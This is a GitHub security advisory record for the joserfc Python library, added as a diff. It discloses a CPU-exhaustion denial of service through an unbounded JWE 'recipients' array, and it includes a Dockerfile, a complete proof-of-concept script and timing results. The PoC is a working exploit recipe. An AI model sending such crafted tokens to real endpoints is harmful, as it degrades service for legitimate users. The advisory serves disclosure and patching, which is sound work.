@@ -1,0 +1,105 @@
+{
+  "id": "GHSA-jpxq-7h8p-2q76",
+  "modified": "2026-10-30T15:15:03.593269331Z",
+  "published": "2026-10-30T14:54:20Z",
+  "aliases": [
+    "CVE-2026-119283"
+  ],
+  "summary": "joserfc: Unbounded JWE General JSON `recipients` Array Leads to CPU Exhaustion (DoS) via Repeated RSA Private-Key Decryption",
+  "details": "### Summary\n\n`joserfc.jwe.decrypt_json()`, the library's public parser for JWE General JSON Serialization, accepts an attacker-controlled `recipients` array of unbounded length and performs one full private-key decryption operation (`decrypt_cek`) for **every** recipient present in the input, with no cap on recipient count. An unauthenticated network attacker who can send a JWE General JSON document to any endpoint that decrypts it with an RSA key (e.g. RSA-OAEP) can force the victim to perform an arbitrary, attacker-chosen number of RSA private-key decryption operations from a single, relatively small HTTP request. This gives the attacker a highly asymmetric CPU-exhaustion (Denial of Service) primitive: local reproduction shows request size growing linearly with recipient count (~396 bytes/recipient) while server-side CPU time grows in lock-step (near 1:1 ratio between recipient-count growth and decrypt-time growth), and the library's only documented mitigation knob, `verify_all_recipients=False`, does **not** reduce the CPU cost, since the decrypt loop attempts every recipient's `decrypt_cek()` unconditionally before that flag is ever consulted. This is CWE-400 (Uncontrolled Resource Consumption) with CVSS v3.1 Base Score 7.5 (High).\n\n### Details\n\n`joserfc` validates and caps several structural elements of a JWE (protected header size, encrypted key size, IV size, ciphertext size, and auth-tag size) inside `src/joserfc/_rfc7516/registry.py`, but performs **no validation whatsoever on the number of entries in the `recipients` array** of a JWE General JSON Serialization object.\n\nData flow (source → sink), verified directly against the repository source at commit `26a10275e88276184f91ae2a6409647bfac7fea5` (joserfc 1.7.4):\n\n1. `src/joserfc/jwe.py:214` — public parser entry point `decrypt_json(data, private_key, ...)`. This is a documented, unauthenticated (at the library boundary) API for parsing externally supplied JWE JSON.\n2. `src/joserfc/jwe.py:238` — if `\"recipients\"` is present in the input dict, `extract_general_json(...)` is invoked.\n3. `src/joserfc/_rfc7516/json.py:84-86` — iterates `for item in data[\"recipients\"]:` and appends a `Recipient` object for every entry, with **no upper bound check** on `len(data[\"recipients\"])`:\n   ```python\n   for item in data[\"recipients\"]:\n       recipient = __extract_recipient(obj, item, registry)\n       obj.recipients.append(recipient)\n   ```\n4. `src/joserfc/jwe.py:252` — the private key is attached to every extracted recipient.\n5. `src/joserfc/_rfc7516/message.py:103-112` — `_perform_decrypt()` loops over **every** recipient in `obj.recipients` and calls `decrypt_recipient(...)` for each one, regardless of how many there are:\n   ```python\n   cek_set = set()\n   for recipient in obj.recipients:\n       headers = recipient.headers()\n       registry.check_header(headers, True)\n       alg = registry.get_alg(headers[\"alg\"])\n       try:\n           cek = decrypt_recipient(alg, enc, recipient, tag)\n           cek_set.add(cek)\n   ```\n6. `src/joserfc/_rfc7518/jwe_algs.py:74-83` — for RSA-OAEP/RSA1_5 recipients, this dispatches to the sink, a genuine RSA private-key operation:\n   ```python\n   def decrypt_cek(self, recipient: Recipient[RSAKey]) -\u003e bytes:\n       key = recipient.recipient_key\n       assert key is not None\n       self.check_key_type(key)\n       op_key = key.get_op_key(\"decrypt\")\n       try:\n           assert recipient.encrypted_key is not None\n           cek = op_key.decrypt(recipient.encrypted_key, self.padding)\n   ```\n\nConfirmed by direct inspection of `src/joserfc/_rfc7516/registry.py`: size caps exist for `max_header_length`, `max_encrypted_key_length`, `max_iv_length`, `max_ciphertext_length`, and `max_auth_tag_length` (registry.py:52-62, 103-121), but no `max_recipients` (or equivalent) field or check exists anywhere in `registry.py`, `json.py`, or `jwe.py`.\n\nCritically, the loop in `message.py:103-112` calls `decrypt_recipient()` for **every** recipient unconditionally — this happens *before* `registry.verify_all_recipients` is ever consulted. Setting `verify_all_recipients=False` (the library's only documented related option) therefore changes whether a decrypt failure raises an exception, but does **not** reduce the number of RSA private-key operations performed, and thus does not mitigate the CPU cost. This was independently confirmed at runtime (see PoC results below): decrypt time is statistically identical between `verify_all_recipients=True` and `verify_all_recipients=False` for the same recipient count.\n\n`decrypt_json()` is not a demo-only or admin-only code path: it is documented in `docs/guide/jwe.rst:156-182` as the standard way to parse and decrypt an externally received General JSON JWE, and requires no special/non-default configuration to trigger. This is functionally analogous to two other resource-exhaustion issues already fixed in the same codebase — the PBES2 `p2c` iteration cap (`src/joserfc/_rfc7518/jwe_algs.py:237-239`) and the JWE compression \"zip bomb\" size cap (`src/joserfc/_rfc7518/jwe_zips.py:11,26-28`) — indicating the recipient-count case was simply missed from the same class of hardening.\n\n### PoC\n\nBoth static (Phase 1) and dynamic, containerized (Phase 2) reproduction confirmed the vulnerability against unmodified joserfc 1.7.4 source.\n\n**Environment setup (Dockerfile):**\n\n```dockerfile\nFROM python:3.12-slim\nWORKDIR /app\n# Copy the exact repository source under test (unmodified).\nCOPY repo /app/repo\n# Install joserfc from local source in editable/normal mode.\nRUN pip install --no-cache-dir /app/repo\n# Copy the PoC script.\nCOPY vuln-001/poc.py /app/poc.py\nENTRYPOINT [\"python3\", \"/app/poc.py\"]\n```\n\nBuild and run (source is used unmodified; container has no network access):\n\n```bash\ndocker build -t joserfc-vuln001 -f vuln-001/Dockerfile .\ndocker run --rm --network none joserfc-vuln001 --recipients 1 500 1500\n```\n\n**PoC logic (`poc.py`):** generates a victim RSA-2048 keypair (representing the RSA key an application would use for RSA-OAEP JWE decryption), crafts a General JSON JWE (`GeneralJSONEncryption`) wrapping a small plaintext with an attacker-chosen number `n` of RSA-OAEP recipients (all using the victim's public key, which is inherently public for JWE encryption), then calls the unmodified public API `joserfc.jwe.decrypt_json()` and measures wall-clock decrypt time, once with `verify_all_recipients=True` and once with `verify_all_recipients=False`.\n\n```python\ndef build_token(public_key, n_recipients: int) -\u003e tuple[str, int]:\n    obj = GeneralJSONEncryption({\"enc\": \"A128GCM\"}, b\"hello\")\n    for _ in range(n_recipients):\n        obj.add_recipient({\"alg\": \"RSA-OAEP\"}, public_key)\n    token = jwe.encrypt_json(obj, None)\n    size_bytes = len(json.dumps(token).encode())\n    return token, size_bytes\n\ndef measure_decrypt(token, private_key, verify_all_recipients: bool) -\u003e float:\n    registry = JWERegistry(verify_all_recipients=verify_all_recipients)\n    t0 = time.perf_counter()\n    out = jwe.decrypt_json(token, private_key, registry=registry)\n    dt = time.perf_counter() - t0\n    assert out.plaintext == b\"hello\"\n    return dt\n```\n\n**Observed results (Phase 2, inside the Docker container, `--network none`, unmodified source):**\n\n```\n[*] Attacker crafts General JSON JWE with recipients=1 ...\n    verify_all_recipients=True  -\u003e decrypt_json() succeeded, size_bytes=536 decrypt_seconds=0.002\n    verify_all_recipients=False -\u003e decrypt_json() succeeded, size_bytes=536 decrypt_seconds=0.001\n[*] Attacker crafts General JSON JWE with recipients=500 ...\n    verify_all_recipients=True  -\u003e decrypt_json() succeeded, size_bytes=198140 decrypt_seconds=0.631\n    verify_all_recipients=False -\u003e decrypt_json() succeeded, size_bytes=198140 decrypt_seconds=0.651\n[*] Attacker crafts General JSON JWE with recipients=1500 ...\n    verify_all_recipients=True  -\u003e decrypt_json() succeeded, size_bytes=594140 decrypt_seconds=1.874\n    verify_all_recipients=False -\u003e decrypt_json() succeeded, size_bytes=594140 decrypt_seconds=1.875\n[CHECK] recipient_count_ratio=1500.0x decrypt_time_ratio=937.0x\n[PASS] decrypt_json() performed one RSA private-key decrypt per attacker-supplied recipient with\n       no upper bound, and verify_all_recipients=False did not mitigate the cost.\n```\n\nIndependent static-phase (Phase 1) reproduction against the same commit, outside the container, produced the same linear-scaling behavior (recipients=500 → 198,140 bytes → 0.627s; recipients=1500 → 594,140 bytes → 1.957s), and the original report's own local run showed recipients=1000 → 396,140 bytes → 1.254s; recipients=3000 → 1,188,140 bytes → 3.762s. In every run, `plaintext=b'hello'` was correctly recovered, confirming each crafted request is fully valid input, not malformed data rejected early.\n\nIn all cases, `verify_all_recipients=False` produced decrypt times statistically identical to `verify_all_recipients=True` for the same recipient count (e.g. 500 recipients: 0.631s vs 0.651s; 1500 recipients: 1.874s vs 1.875s), empirically confirming that this documented flag does not mitigate the CPU cost.\n\n### Impact\n\nThis is a remote, unauthenticated CPU-exhaustion Denial-of-Service vulnerability (CWE-400, Uncontrolled Resource Consumption). Any application that:\n\n- exposes an endpoint (or message-processing path) that accepts JWE data in General JSON Serialization form, and\n- decrypts it using `joserfc.jwe.decrypt_json()` with an RSA-based key-management algorithm (e.g. RSA-OAEP, RSA1_5)\n\nis impacted. The attacker needs only the victim's RSA public key — which is inherently public, since it is used by legitimate senders to encrypt JWEs to the victim. Because request size scales linearly with recipient count (~396 bytes per recipient) while attacker-inflicted server CPU cost scales in lock-step with recipient count, the attacker gets a highly favorable cost asymmetry: e.g. a ~1.2 MB request forced ~3.8 seconds of RSA-2048 private-key decrypt operations in testing. Repeated or concurrent requests of this shape can exhaust available CPU/worker capacity on the victim service, degrading or denying availability for legitimate users. Confidentiality and integrity are not affected (no key material or plaintext is disclosed or corrupted); the impact is availability only, matching the CVSS vector's `C:N/I:N/A:H`.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\n# VULN-001 dynamic reproduction environment\n# Unbounded JWE General JSON \"recipients\" array causes CPU exhaustion via\n# repeated RSA private-key decryption in joserfc's decrypt_json().\n#\n# This image builds joserfc from the local repository clone (unmodified\n# source) and provides a Python environment to run poc.py against it.\n\nFROM python:3.12-slim\n\nWORKDIR /app\n\n# Copy the exact repository source under test (unmodified).\nCOPY repo /app/repo\n\n# Install joserfc from local source in editable/normal mode.\nRUN pip install --no-cache-dir /app/repo\n\n# Copy the PoC script.\nCOPY vuln-001/poc.py /app/poc.py\n\nENTRYPOINT [\"python3\", \"/app/poc.py\"]\n```\n\n#### `poc.py`\n\n```python\n\"\"\"\nVULN-001 dynamic PoC: Unbounded JWE General JSON \"recipients\" array causes\nCPU exhaustion (CWE-400) via repeated RSA private-key decryption inside\njoserfc's public parser API `joserfc.jwe.decrypt_json()`.\n\nData flow reproduced end to end (unmodified joserfc source):\n  1. joserfc.jwe.decrypt_json()                         (src/joserfc/jwe.py:214)\n  2. -\u003e extract_general_json()                           (src/joserfc/_rfc7516/json.py:73)\n  3. -\u003e for item in data[\"recipients\"]: (NO COUNT CAP)   (src/joserfc/_rfc7516/json.py:84)\n  4. -\u003e perform_decrypt() -\u003e _perform_decrypt()          (src/joserfc/_rfc7516/message.py:93-112)\n  5. -\u003e for recipient in obj.recipients: decrypt_recipient(...) for EVERY recipient,\n        regardless of registry.verify_all_recipients\n  6. -\u003e RSAAlgModel.decrypt_cek(): op_key.decrypt(...)   (src/joserfc/_rfc7518/jwe_algs.py:74-83)\n     performs one real RSA-2048 private-key decrypt operation per recipient.\n\nThis script:\n  (a) builds a victim RSA keypair (2048-bit, as an application would use for\n      RSA-OAEP JWE decryption),\n  (b) crafts a General JSON JWE token with an attacker-chosen number of\n      RSA-OAEP recipients, all wrapping the SAME small ciphertext,\n  (c) measures wall-clock CPU time joserfc's unmodified decrypt_json() spends\n      processing the token as the recipient count grows,\n  (d) shows that setting verify_all_recipients=False (the only public\n      mitigation knob mentioned in the docs) does NOT reduce the CPU cost,\n      because the decrypt loop in message.py always attempts every\n      recipient's decrypt_cek() before that flag is ever consulted.\n\nDeterministic PASS criteria (printed as machine-readable JSON lines):\n  - decrypt_json() succeeds (returns correct plaintext) for all recipient counts.\n  - decrypt_seconds scales roughly linearly with recipient count (attacker\n    control over victim CPU cost, unbounded by the library).\n  - decrypt_seconds for verify_all_recipients=False is statistically the same\n    order of magnitude as verify_all_recipients=True for the same recipient\n    count (proving the documented mitigation does not help).\n\"\"\"\n\nimport argparse\nimport json\nimport time\n\nfrom joserfc import jwe, jwk\nfrom joserfc.jwe import GeneralJSONEncryption\nfrom joserfc.jwe import JWERegistry\n\n\ndef build_token(public_key, n_recipients: int) -\u003e tuple[str, int]:\n    \"\"\"Craft a General JSON JWE with n_recipients RSA-OAEP recipients,\n    all wrapping the same small plaintext. This is exactly the shape an\n    unauthenticated network attacker can send to any endpoint that calls\n    jwe.decrypt_json() on external input, as documented in\n    docs/guide/jwe.rst.\"\"\"\n    obj = GeneralJSONEncryption({\"enc\": \"A128GCM\"}, b\"hello\")\n    for _ in range(n_recipients):\n        obj.add_recipient({\"alg\": \"RSA-OAEP\"}, public_key)\n    token = jwe.encrypt_json(obj, None)\n    size_bytes = len(json.dumps(token).encode())\n    return token, size_bytes\n\n\ndef measure_decrypt(token, private_key, verify_all_recipients: bool) -\u003e float:\n    registry = JWERegistry(verify_all_recipients=verify_all_recipients)\n    t0 = time.perf_counter()\n    out = jwe.decrypt_json(token, private_key, registry=registry)\n    dt = time.perf_counter() - t0\n    assert out.plaintext == b\"hello\", f\"unexpected plaintext: {out.plaintext!r}\"\n    return dt\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"VULN-001 dynamic reproduction PoC\")\n    parser.add_argument(\n        \"--recipients\",\n        type=int,\n        nargs=\"+\",\n        default=[1, 500, 1500],\n        help=\"Recipient counts to test (attacker-controlled array length).\",\n    )\n    parser.add_argument(\n        \"--key-bits\",\n        type=int,\n        default=2048,\n        help=\"RSA key size of the victim's decryption key.\",\n    )\n    args = parser.parse_args()\n\n    print(f\"[*] Generating victim RSA-{args.key_bits} keypair (RSA-OAEP JWE key)...\")\n    private_key = jwk.RSAKey.generate_key(args.key_bits)\n    public_key = jwk.RSAKey.import_key(private_key.as_dict(private=False))\n    print(\"[*] Victim private key generated locally; public key is what an attacker would normally have.\")\n\n    results = []\n    for n in args.recipients:\n        print(f\"\\n[*] Attacker crafts General JSON JWE with recipients={n} ...\")\n        token, size_bytes = build_token(public_key, n)\n\n        dt_verify_true = measure_decrypt(token, private_key, verify_all_recipients=True)\n        print(\n            f\"    verify_all_recipients=True  -\u003e decrypt_json() succeeded, \"\n            f\"size_bytes={size_bytes} decrypt_seconds={dt_verify_true:.3f}\"\n        )\n\n        dt_verify_false = measure_decrypt(token, private_key, verify_all_recipients=False)\n        print(\n            f\"    verify_all_recipients=False -\u003e decrypt_json() succeeded, \"\n            f\"size_bytes={size_bytes} decrypt_seconds={dt_verify_false:.3f} \"\n            f\"(documented 'mitigation' does NOT reduce CPU cost)\"\n        )\n\n        results.append(\n            {\n                \"recipients\": n,\n                \"size_bytes\": size_bytes,\n                \"decrypt_seconds_verify_all_true\": round(dt_verify_true, 3),\n                \"decrypt_seconds_verify_all_false\": round(dt_verify_false, 3),\n            }\n        )\n\n    print(\"\\n[RESULT_JSON] \" + json.dumps(results))\n\n    # Deterministic scaling check: CPU time for the largest recipient count\n    # must be substantially larger (order of magnitude, not noise) than for\n    # the smallest, proving attacker control over victim CPU consumption.\n    baseline = results[0][\"decrypt_seconds_verify_all_true\"]\n    worst = results[-1][\"decrypt_seconds_verify_all_true\"]\n    ratio = worst / baseline if baseline \u003e 0 else float(\"inf\")\n    recipient_ratio = results[-1][\"recipients\"] / results[0][\"recipients\"]\n    print(\n        f\"[CHECK] recipient_count_ratio={recipient_ratio:.1f}x \"\n        f\"decrypt_time_ratio={ratio:.1f}x \"\n        f\"(unbounded recipients =\u003e unbounded RSA-decrypt CPU cost, no cap in registry.py)\"\n    )\n\n    if ratio \u003c recipient_ratio * 0.3:\n        print(\"[FAIL] Decrypt time did not scale with recipient count as expected.\")\n        raise SystemExit(1)\n\n    print(\"[PASS] decrypt_json() performed one RSA private-key decrypt per attacker-supplied \"\n          \"recipient with no upper bound, and verify_all_recipients=False did not mitigate the cost.\")\n\n\nif __name__ == \"__main__\":\n    main()\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "joserfc",
+        "purl": "pkg:pypi/joserfc"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.7.5"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.10.0",
+        "0.11.0",
+        "0.11.1",
+        "0.12.0",
+        "0.2.0",
+        "0.3.0",
+        "0.4.0",
+        "0.5.0",
+        "0.6.0",
+        "0.7.0",
+        "0.8.0",
+        "0.9.0",
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.2.2",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.3.3",
+        "1.3.4",
+        "1.3.5",
+        "1.4.0",
+        "1.4.1",
+        "1.4.2",
+        "1.4.3",
+        "1.5.0",
+        "1.6.0",
+        "1.6.1",
+        "1.6.2",
+        "1.6.3",
+        "1.6.4",
+        "1.6.5",
+        "1.6.7",
+        "1.6.8",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-jpxq-7h8p-2q76/GHSA-jpxq-7h8p-2q76.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/joserfc/security/advisories/GHSA-jpxq-7h8p-2q76"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-119283"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/joserfc/commit/d6dc8df6c7609277e741069d3733e43996c1cd17"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/authlib/joserfc"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/joserfc/releases/tag/1.7.5"
+    }
+  ]
+}
